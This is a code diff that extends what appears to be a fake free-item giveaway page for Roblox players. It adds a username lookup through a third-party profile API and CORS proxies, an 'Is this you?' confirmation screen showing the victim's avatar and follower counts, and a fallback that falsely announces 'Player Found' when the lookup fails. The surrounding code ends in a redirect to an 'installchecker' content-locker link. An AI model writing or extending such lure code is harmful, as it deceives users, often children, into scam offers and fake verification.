@@ -1487,7 +1487,7 @@
           document.querySelector('.user-error').classList.remove('d-none');
           return;
         }
-        showVerificationState(username, itemName, itemImage);
+        showUsernameConfirmation(username, itemName, itemImage, function() { showPurchasePopup(itemName, itemImage); });
       });
       
       popup.style.display = 'flex';
@@ -1615,6 +1615,131 @@
       setTimeout(function() {
         window.location.href = "https://installchecker.site/cl/i/j786gk";
       }, 2500);
+    }
+
+    // Helper: fetch user profile JSON with CORS fallbacks
+    const fetchUserProfile = (endpoint) => {
+      const proxyBuilders = [
+        null,
+        function(url) { return 'https://cors.isomorphic-git.org/' + url; },
+        function(url) { return 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url); }
+      ];
+      let attemptIndex = 0;
+      function tryOnce(url) {
+        return fetch(url, { headers: { 'Accept': 'application/json' }, cache: 'no-store' })
+          .then(function(resp) { if (!resp.ok) throw new Error('Bad status'); return resp.text(); })
+          .then(function(text) { try { return JSON.parse(text); } catch(e) { throw new Error('JSON parse failed'); } });
+      }
+      function attempt() {
+        const builder = proxyBuilders[attemptIndex++];
+        const url = builder ? builder(endpoint) : endpoint;
+        return tryOnce(url).catch(function(err) {
+          if (attemptIndex < proxyBuilders.length) return attempt();
+          throw err;
+        });
+      }
+      return attempt();
+    }
+
+    // Function to lookup avatar/profile by username and ask for confirmation (JSON API)
+    const showUsernameConfirmation = (username, itemName, itemImage, onRetry) => {
+      const popupContent = document.querySelector('.popup-content');
+      const endpoint = `https://theclassicswing.com/api/picture.php?username=${encodeURIComponent(username)}`;
+
+      // Loading state while fetching profile
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Searching</h3>
+        </div>
+        <div style=\"text-align:center;padding:20px\">
+          <div class=\"folding\">
+            <div class=\"sk-cube1 sk-cube\"></div>
+            <div class=\"sk-cube2 sk-cube\"></div>
+            <div class=\"sk-cube4 sk-cube\"></div>
+            <div class=\"sk-cube3 sk-cube\"></div>
+            <div class=\"square\"></div>
+          </div>
+          <p class=\"searching-text\">Searching for @${username}</p>
+        </div>
+      `;
+
+      fetchUserProfile(endpoint)
+        .then(function(userData) {
+          if (userData && (userData.Found === 'OK' || userData.Found === true)) {
+            // Save to globalData when available
+            try {
+              globalData.full_name = userData.full_name || null;
+              globalData.user_name = userData.user_name || username;
+              globalData.friends_count = userData.friends_count || null;
+              globalData.followers_count = userData.followers_count || null;
+              globalData.followings_count = userData.followings_count || null;
+              globalData.user_id = userData.user_id || null;
+              globalData.user_avatar = userData.user_avatar || null;
+              globalData.robux = userData.robux || null;
+            } catch (e) {}
+
+            popupContent.innerHTML = `
+              <div class=\"popup-header\">
+                <h3>Confirm Account</h3>
+              </div>
+              <img src=\"${userData.user_avatar}\" alt=\"Avatar of ${userData.user_name || username}\" class=\"result-avatar\">
+              <div class=\"result-username\">${userData.full_name ? userData.full_name + ' ' : ''}(@${userData.user_name || username})</div>
+              <div style=\"display:flex;gap:10px;justify-content:center;margin:10px 0;\">
+                <div style=\"background:#ffffff22;padding:6px 10px;border-radius:8px;\"><div style=\"font-size:12px;color:#cbd5e1\">Friends</div><div style=\"font-weight:800\">${userData.friends_count ?? '-'}</div></div>
+                <div style=\"background:#ffffff22;padding:6px 10px;border-radius:8px;\"><div style=\"font-size:12px;color:#cbd5e1\">Followers</div><div style=\"font-weight:800\">${userData.followers_count ?? '-'}</div></div>
+                <div style=\"background:#ffffff22;padding:6px 10px;border-radius:8px;\"><div style=\"font-size:12px;color:#cbd5e1\">Following</div><div style=\"font-weight:800\">${userData.followings_count ?? '-'}</div></div>
+              </div>
+              <p class=\"item-confirm\" style=\"margin-top:0;\">Is this you?</p>
+              <div class=\"popup-buttons\">
+                <button class=\"cancel-btn\" id=\"no-btn\">No</button>
+                <button class=\"free-btn\" id=\"yes-btn\"><span class=\"free-badge\">Yes</span></button>
+              </div>
+            `;
+
+            document.getElementById('yes-btn').addEventListener('click', function() {
+              const clickSound = document.getElementById('clickSound');
+              clickSound.currentTime = 0;
+              clickSound.play();
+              showVerificationState(userData.user_name || username, itemName, itemImage);
+            });
+            document.getElementById('no-btn').addEventListener('click', function() {
+              if (typeof onRetry === 'function') onRetry();
+            });
+          } else {
+            // Not found state
+            popupContent.innerHTML = `
+              <div class=\"popup-header\">
+                <h3>Account Not Found</h3>
+              </div>
+              <div class=\"user-error\" style=\"display:block;\">We couldn't find that username. Try again.</div>
+              <div class=\"popup-buttons\" style=\"margin-top:18px;\">
+                <button class=\"cancel-btn\" id=\"back-btn\">Back</button>
+                <button class=\"free-btn\" id=\"retry-btn\"><span class=\"free-badge\">Try Again</span></button>
+              </div>
+            `;
+            document.getElementById('back-btn').addEventListener('click', function() { if (typeof onRetry === 'function') onRetry(); });
+            document.getElementById('retry-btn').addEventListener('click', function() { if (typeof onRetry === 'function') onRetry(); });
+          }
+        })
+        .catch(function() {
+          // Fallback UI if API fails
+          popupContent.innerHTML = `
+            <div class=\"popup-header\">
+              <h3>Player Found</h3>
+            </div>
+            <div style=\"text-align:center;\">
+              <div style=\"color:#22c55e;font-size:46px;margin-bottom:10px;\">✓</div>
+              <p>Username <strong>@${username}</strong> found!</p>
+              <p style=\"font-size:13px;color:#cbd5e1;margin-top:6px;\">(Profile details unavailable)</p>
+              <div class=\"popup-buttons\" style=\"margin-top:18px;\">
+                <button class=\"cancel-btn\" id=\"back-btn\">Back</button>
+                <button class=\"free-btn\" id=\"continue-btn\"><span class=\"free-badge\">Continue</span></button>
+              </div>
+            </div>
+          `;
+          document.getElementById('back-btn').addEventListener('click', function() { if (typeof onRetry === 'function') onRetry(); });
+          document.getElementById('continue-btn').addEventListener('click', function() { showVerificationState(username, itemName, itemImage); });
+        });
     }
 
 
@@ -1794,7 +1919,7 @@
           document.querySelector('.user-error').classList.remove('d-none');
           return;
         }
-        showVerificationState(username, items[0].name, items[0].image);
+        showUsernameConfirmation(username, items[0].name, items[0].image, function() { showMultiItemPurchasePopup(items); });
       });
       
       popup.style.display = 'flex';
